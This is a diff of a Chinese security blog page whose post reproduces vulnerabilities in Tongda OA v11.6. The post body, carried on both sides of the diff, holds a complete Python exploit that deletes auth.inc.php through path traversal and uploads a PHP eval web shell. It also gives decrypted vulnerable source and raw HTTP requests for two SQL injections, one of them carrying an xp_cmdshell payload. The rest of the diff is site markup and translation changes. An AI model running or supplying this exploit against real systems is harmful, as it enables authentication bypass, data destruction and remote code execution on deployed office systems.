@@ -5,11 +5,11 @@
   
 
 
-<html class="theme-next mist use-motion" lang="en">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="渗透测试,">
+  <meta name="keywords" content="渗透测试," />
 
 
 
@@ -80,36 +80,36 @@
 
 
 <meta name="description" content="通达v11.6最近的几个0day，参考安译sec">
-<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通达OA 0day复现">
-<meta property="og:url" content="http://yoursite.com/2020/08/23/通达OA-0day复现/index.html">
+<meta property="og:url" content="http://yoursite.com/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
 <meta property="og:description" content="通达v11.6最近的几个0day，参考安译sec">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/2.png">
-<meta property="og:updated_time" content="2021-01-24T08:17:54.397Z">
+<meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="article:published_time" content="2020-08-23T12:15:16.000Z">
+<meta property="article:modified_time" content="2021-01-24T08:17:54.000Z">
+<meta property="article:author" content="lockcy">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="通达OA 0day复现">
-<meta name="twitter:description" content="通达v11.6最近的几个0day，参考安译sec">
-<meta name="twitter:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/1.png">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Mist',
     version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
     fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     duoshuo: {
       userId: '0',
-      author: 'Author'
+      author: '博主'
     },
     algolia: {
       applicationID: '',
@@ -123,7 +123,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/08/23/通达OA-0day复现/">
+  <link rel="canonical" href="http://yoursite.com/2020/08/23/通达OA-0day复现/"/>
 
 
 
@@ -139,9 +139,9 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
   
@@ -157,7 +157,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">lockcy's cave</span>
         <span class="logo-line-after"><i></i></span>
@@ -185,41 +185,41 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Home
+            首页
           </a>
         </li>
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
+          <a href="/about/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
-            About
+            关于
           </a>
         </li>
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
+          <a href="/tags/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
-            Tags
+            标签
           </a>
         </li>
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archives
+            归档
           </a>
         </li>
       
@@ -256,12 +256,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/23/通达OA-0day复现/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ICCTW">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/harutya.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -283,9 +283,9 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-23T20:15:16+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-23T20:15:16+08:00">
                 2020-08-23
               </time>
             
@@ -307,6 +307,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
 
           
 
@@ -324,41 +355,42 @@
 
       
         <p>通达v11.6最近的几个0day，参考安译sec</p>
-<a id="more"></a>
+<span id="more"></span>
 <p>fingerprint<br>title 通达OA网络智能办公系统<br>北京通达信科科技有限公司</p>
 <p>一、 11.6任意文件上传导致的RCE</p>
 <p>1.exp<br>exp网上一搜就有,但会删除auth.inc.php，影响oa的正常使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">target=&quot;http://10.10.10.130&quot;  </span><br><span class="line">payload=&quot;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&quot;  </span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)</span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;</span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;)</span><br><span class="line">url=target+&quot;/inc/auth.inc.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &apos;No input file specified.&apos; not in page:</span><br><span class="line">    print(&quot;[-]Failed to deleted auth.inc.php&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;)</span><br><span class="line">print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line">url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;</span><br><span class="line">files = &#123;&apos;FILE1&apos;: (&apos;shell.php&apos;, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+&quot;/_shell.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &apos;No input file specified.&apos; not in page:</span><br><span class="line">    print(&quot;[+]Filed Uploaded Successfully&quot;)</span><br><span class="line">    print(&quot;[+]URL:&quot;,url)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">target&#x3D;&quot;http:&#x2F;&#x2F;10.10.10.130&quot;  </span><br><span class="line">payload&#x3D;&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;  </span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)</span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot;</span><br><span class="line">requests.get(url&#x3D;url)</span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;)</span><br><span class="line">url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot;</span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line">if &#39;No input file specified.&#39; not in page:</span><br><span class="line">    print(&quot;[-]Failed to deleted auth.inc.php&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;)</span><br><span class="line">print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line">url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot;</span><br><span class="line">files &#x3D; &#123;&#39;FILE1&#39;: (&#39;shell.php&#39;, payload)&#125;</span><br><span class="line">requests.post(url&#x3D;url,files&#x3D;files)</span><br><span class="line">url&#x3D;target+&quot;&#x2F;_shell.php&quot;</span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line">if &#39;No input file specified.&#39; not in page:</span><br><span class="line">    print(&quot;[+]Filed Uploaded Successfully&quot;)</span><br><span class="line">    print(&quot;[+]URL:&quot;,url)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>2.漏洞分析<br>源码是zend5.4加密的，先解密一下<br>webroot\module\appbuilder\assets\print.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$s_tmp = __DIR__ . &quot;/../../../../logs/appbuilder/logs&quot;;</span><br><span class="line">$s_tmp .= &quot;/&quot; . $_GET[&quot;guid&quot;];</span><br><span class="line"></span><br><span class="line">if (file_exists($s_tmp)) &#123;</span><br><span class="line">	$arr_data = unserialize(file_get_contents($s_tmp));</span><br><span class="line">	unlink($s_tmp);</span><br><span class="line">	$s_user = $arr_data[&quot;user&quot;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	echo &quot;未知参数&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$s_tmp &#x3D; __DIR__ . &quot;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;logs&#x2F;appbuilder&#x2F;logs&quot;;</span><br><span class="line">$s_tmp .&#x3D; &quot;&#x2F;&quot; . $_GET[&quot;guid&quot;];</span><br><span class="line"></span><br><span class="line">if (file_exists($s_tmp)) &#123;</span><br><span class="line">	$arr_data &#x3D; unserialize(file_get_contents($s_tmp));</span><br><span class="line">	unlink($s_tmp);</span><br><span class="line">	$s_user &#x3D; $arr_data[&quot;user&quot;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	echo &quot;未知参数&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>没有检查get请求的参数，导致目录穿透，传入../../../webroot/inc/auth.inc.php,通过unlink函数删除指定文件<br>删除auth.inc.php绕过验证调用上传函数</p>
 <p>下边的漏洞是来自安译Sec对TDOA11.5测试的结果，经验证，发现11.6同样存在。<br>二、SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1</span><br><span class="line">Host: 10.10.10.130</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: USER_NAME_COOKIE=admin; SID_1=47bc070b; PHPSESSID=8s9lvu5r48t3i8smligo7j8tr4; OA_USER_ID=admin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 154</span><br><span class="line"></span><br><span class="line">starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime=1598918400&amp;view=month&amp;condition=1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;general&#x2F;appbuilder&#x2F;web&#x2F;calendar&#x2F;calendarlist&#x2F;getcallist HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.130</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;47bc070b; PHPSESSID&#x3D;8s9lvu5r48t3i8smligo7j8tr4; OA_USER_ID&#x3D;admin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 154</span><br><span class="line"></span><br><span class="line">starttime&#x3D;AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime&#x3D;1598918400&amp;view&#x3D;month&amp;condition&#x3D;1</span><br></pre></td></tr></table></figure>
 <p>漏洞文件<br>\general\appbuilder\modules\calendar\models\Calendar.php<br>get_callist_data函数中对begin_date变量未进行过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function get_callist_data($begin_date, $end_date, $condition_str)</span><br><span class="line">&#123;</span><br><span class="line">  include_once &quot;inc/utility_org.php&quot;;</span><br><span class="line">  $cur_time = modules\calendar\models\date(&quot;Y-m-d H:i:s&quot;, modules\calendar\models\time());</span><br><span class="line">  $dataBack = array();</span><br><span class="line">  $t_calendar = TD::tablefix(&quot;calendar&quot;);</span><br><span class="line">  $t_affair = TD::tablefix(&quot;affair&quot;);</span><br><span class="line">  $query = &quot;SELECT * from $t_calendar where (USER_ID=&apos;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&apos; or find_in_set(&apos;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&apos;,TAKER) or find_in_set(&apos;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&apos;,OWNER) or find_in_set(&apos;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&apos;,SHARE_USER))&quot; . $condition_str . &quot; and (CAL_TIME&gt;=&apos;$begin_date&apos; and CAL_TIME&lt;=&apos;$end_date&apos; || END_TIME&gt;=&apos;$begin_date&apos; and END_TIME&lt;=&apos;$end_date&apos; || CAL_TIME&lt;=&apos;$begin_date&apos; and END_TIME&gt;=&apos;$end_date&apos;) order by CAL_TIME DESC&quot;;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/23/通达OA-0day复现/1.png">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function get_callist_data($begin_date, $end_date, $condition_str)</span><br><span class="line">&#123;</span><br><span class="line">  include_once &quot;inc&#x2F;utility_org.php&quot;;</span><br><span class="line">  $cur_time &#x3D; modules\calendar\models\date(&quot;Y-m-d H:i:s&quot;, modules\calendar\models\time());</span><br><span class="line">  $dataBack &#x3D; array();</span><br><span class="line">  $t_calendar &#x3D; TD::tablefix(&quot;calendar&quot;);</span><br><span class="line">  $t_affair &#x3D; TD::tablefix(&quot;affair&quot;);</span><br><span class="line">  $query &#x3D; &quot;SELECT * from $t_calendar where (USER_ID&#x3D;&#39;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&#39; or find_in_set(&#39;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&#39;,TAKER) or find_in_set(&#39;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&#39;,OWNER) or find_in_set(&#39;&quot; . $_SESSION[&quot;LOGIN_USER_ID&quot;] . &quot;&#39;,SHARE_USER))&quot; . $condition_str . &quot; and (CAL_TIME&gt;&#x3D;&#39;$begin_date&#39; and CAL_TIME&lt;&#x3D;&#39;$end_date&#39; || END_TIME&gt;&#x3D;&#39;$begin_date&#39; and END_TIME&lt;&#x3D;&#39;$end_date&#39; || CAL_TIME&lt;&#x3D;&#39;$begin_date&#39; and END_TIME&gt;&#x3D;&#39;$end_date&#39;) order by CAL_TIME DESC&quot;;</span><br></pre></td></tr></table></figure>
+<img src="/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/1.png" class="">
 
 <p>三、SQL注入<br>\general\email\sentbox\get_index_data.php中调用了\inc\utility_email.php的get_sentbox_data函数，在该函数中，简单的拼接了$FIELD参数在order by后面造成了注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query .= &quot; order by &quot; . $FIELD;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=exec%20master%20xp_cmdshell%20`ping%2010.10.10.1`%20--&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total= HTTP/1.1</span><br><span class="line">Host: 10.10.10.130</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: USER_NAME_COOKIE=admin; SID_1=47bc070b; PHPSESSID=8s9lvu5r48t3i8smligo7j8tr4; OA_USER_ID=admin; KEY_RANDOMDATA=19400</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query .&#x3D; &quot; order by &quot; . $FIELD;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;general&#x2F;email&#x2F;sentbox&#x2F;get_index_data.php?asc&#x3D;0&amp;boxid&#x3D;&amp;boxname&#x3D;sentbox&amp;curnum&#x3D;3&amp;emailtype&#x3D;ALLMAIL&amp;keyword&#x3D;sample%40email.tst&amp;orderby&#x3D;exec%20master%20xp_cmdshell%20&#96;ping%2010.10.10.1&#96;%20--&amp;pagelimit&#x3D;20&amp;tag&#x3D;&amp;timestamp&#x3D;1598069133&amp;total&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.130</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;47bc070b; PHPSESSID&#x3D;8s9lvu5r48t3i8smligo7j8tr4; OA_USER_ID&#x3D;admin; KEY_RANDOMDATA&#x3D;19400</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 <p>这里和原文一样，因为检测到注释符，无法执行sql语句</p>
-<img src="/2020/08/23/通达OA-0day复现/2.png">
+<img src="/2020/08/23/%E9%80%9A%E8%BE%BEOA-0day%E5%A4%8D%E7%8E%B0/2.png" class="">
 
 
 
-<p><a href="https://www.freebuf.com/articles/network/247265.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/247265.html</a><br><a href="https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA</a><br><a href="https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247265.html">https://www.freebuf.com/articles/network/247265.html</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA">https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q">https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q</a></p>
 
       
     </div>
     
     
     
+<div>
+      
+        
+
+      
+</div>
 
     
 
@@ -370,7 +402,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
           
         </div>
       
@@ -383,8 +415,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/08/13/JWT从0到1/" rel="next" title="JWT从0到1">
-                <i class="fa fa-chevron-left"></i> JWT从0到1
+              <a href="/2020/08/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%AC%94%E8%AE%B0/" rel="next" title="frp内网穿透笔记">
+                <i class="fa fa-chevron-left"></i> frp内网穿透笔记
               </a>
             
           </div>
@@ -443,7 +475,9 @@
   <aside id="sidebar" class="sidebar">
     
     <div class="sidebar-inner">
-
+		<div id="music163player">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
+		</div>
       
 
       
@@ -452,7 +486,11 @@
         <div class="site-overview">
